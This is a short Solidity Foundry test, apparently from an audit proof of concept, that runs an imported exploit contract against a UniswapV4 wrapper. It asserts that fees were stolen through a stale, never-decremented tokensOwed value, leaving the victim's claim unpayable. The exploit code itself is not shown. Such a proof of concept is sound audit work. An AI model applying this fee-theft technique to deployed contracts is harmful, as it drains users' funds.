// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./61328-fees-can-be-stolen-from-partially-unwrapped-uniswapv4wrapper.sol";

contract Vii61328Test is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.feeTheft0(), 90, "stole 90 fee units via stale tokensOwed");
        assertGt(e.stolen0(), 900, "more than re-wrap principal");
        (uint256 victimClaim,) = e.wrapper().tokensOwed(e.V_ID());
        assertEq(victimClaim, 100, "tokensOwed never decremented for victim");
        assertLt(e.token0().balanceOf(address(e.wrapper())), victimClaim, "wrapper short for victim fees");
    }
}
